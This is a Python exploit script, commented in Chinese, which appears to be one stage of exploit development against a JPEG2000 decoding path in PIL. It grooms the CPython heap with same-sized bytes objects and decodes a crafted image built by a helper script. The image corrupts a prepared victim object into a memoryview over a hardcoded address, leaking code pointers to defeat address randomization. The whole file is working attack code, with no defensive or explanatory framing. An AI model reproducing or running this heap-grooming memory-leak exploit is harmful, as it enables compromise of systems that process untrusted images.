#!/usr/bin/env python3
# 信息泄露 v6：复刻 §19 已验证配方
#   ① 受害对象【最先】创建（单个 bytes(519)，内容预置 memoryview 所需字段）
#   ② 然后 prime + pairs（填满 0x230 档）+ 只释放一个 D 洞
#   ③ 构建（子进程，不影响堆）④ 主进程解码（信号处理器兜底 dump）
#   目标：victim 被改成 memoryview，buf=0xa500d0 => 读出代码指针
import ctypes, gc, io, os, signal, struct, subprocess, sys
from PIL import Image

R = lambda a: ctypes.c_uint64.from_address(a).value
PY_MV = 0xA350C8
READ_ADDR = 0xA500D0
PY_BYTES_TYPE = 0xA22670
RES = '/tmp/leak_result6.txt'

# ① 受害对象：519 字节（与数组洞同档 0x230），内容预置 memoryview 字段
raw = bytearray(519)
struct.pack_into('<Q', raw, 0x20, PY_BYTES_TYPE)   # obj+0x40 = view.obj（非空合法）
struct.pack_into('<Q', raw, 0x28, 0x40)            # obj+0x48 = len（会被耦合覆盖）
struct.pack_into('<Q', raw, 0x30, 1)               # obj+0x50 = itemsize
struct.pack_into('<Q', raw, 0x38, 0x100000000)     # obj+0x58 = ndim/readonly
victim = bytes(raw)
VADDR = id(victim)
print("[*] victim=%#x type=%#x" % (VADDR, R(VADDR + 8)))
if VADDR >= 0x1000000:
    print("[!] victim 地址不可表达"); sys.exit(1)

# ③ 构建（子进程）
r = subprocess.run(['python3', '/tmp/mk13.py', '/tmp/exp/base.j2k', '/tmp/LEAK6.j2k', '0', '23',
                    hex(PY_MV), hex(0xA40000), hex(READ_ADDR), '-370'],
                   capture_output=True, text=True)
print("[*] build:", (r.stdout + r.stderr).strip()[:60])
if 'OK' not in r.stdout:
    sys.exit(1)


def dump(tag):
    out = [tag]
    out.append("victim=%#x" % VADDR)
    out.append("  +0x08 type=%#x (期望 %#x)" % (R(VADDR + 8), PY_MV))
    out.append("  +0x20=%#x +0x38=%#x +0x48=%#x" % (R(VADDR + 0x20), R(VADDR + 0x38), R(VADDR + 0x48)))
    try:
        if R(VADDR + 8) == PY_MV:
            data = victim[:64].tobytes()
            out.append("  读出64B=" + data.hex())
            ptrs = [struct.unpack_from('<Q', data, k)[0] for k in range(0, 64, 8)]
            out.append("  指针=" + ",".join(hex(x) for x in ptrs if x > 0x10000))
    except BaseException as e:
        out.append("  读取异常 %r" % (e,))
    with open(RES, 'w') as f:
        f.write("\n".join(out))


def on_sig(sig, frm):
    dump("崩于信号 %d" % sig)
    os._exit(0)


for s2 in (signal.SIGABRT, signal.SIGSEGV, signal.SIGBUS):
    signal.signal(s2, on_sig)

# ② prime + pairs + 单洞
good = []
for attempt in range(8):
    gc.collect()
    prime = [bytes(519) for _ in range(1024)]
    del prime
    pairs = [(bytes(519), bytes(bytearray(519))) for _ in range(400)]
    good = [(D, Bv) for (D, Bv) in pairs if id(Bv) - id(D) == 0x230]
    if good:
        break
    del pairs
print("[*] 相邻对 = %d (试了 %d 次)" % (len(good), attempt + 1))
if not good:
    sys.exit(0)

keep = [t for i, t in enumerate(good) if i != len(good) // 2]
Ks = [Bv for (D, Bv) in keep]
holeD = good[len(good) // 2][0]
del holeD, pairs, good, keep
gc.collect()

# ④ 解码
try:
    M = open('/tmp/LEAK6.j2k', 'rb').read()
    im = Image.open(io.BytesIO(M)); im.load()
    dump("解码完成")
except BaseException as e:
    dump("解码异常 %r" % (e,))

print(open(RES).read() if os.path.exists(RES) else "(无结果)")